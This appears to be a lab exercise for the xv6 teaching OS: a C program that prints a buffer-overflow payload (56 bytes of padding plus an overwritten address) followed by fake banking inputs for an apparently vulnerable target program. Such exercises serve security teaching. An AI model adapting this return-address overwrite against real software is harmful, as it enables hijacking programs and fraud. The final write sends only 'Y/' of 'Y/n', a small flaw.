#include "kernel/types.h"
#include "user/user.h"

int
main(void)
{
    // Write 56 bytes of padding (7 groups of 8 'A' characters).
    // These bytes are sent to standard output.
    write(1, "AAAAAAAA", 8);
    write(1, "AAAAAAAA", 8);
    write(1, "AAAAAAAA", 8);
    write(1, "AAAAAAAA", 8);
    write(1, "AAAAAAAA", 8);
    write(1, "AAAAAAAA", 8);
    write(1, "AAAAAAAA", 8);


    // The bytes are using hexadecimal.
    write(1, "\x52\x00\x00\x00\x00\x00\x00\x00", 8);

    // Send a newline character to terminate the current input line.
    write(1, "\n", 1);

    // Write the deposit amount followed by a newline.
    write(1, "100\n", 4);
    write(1, "John Smith\n", 11);
    write(1, "123456\n", 7);
    write(1, "87654321\n", 9);
    // Write the transaction confirmation response.
    write(1, "Y/n", 2);
   
    exit(0);
}
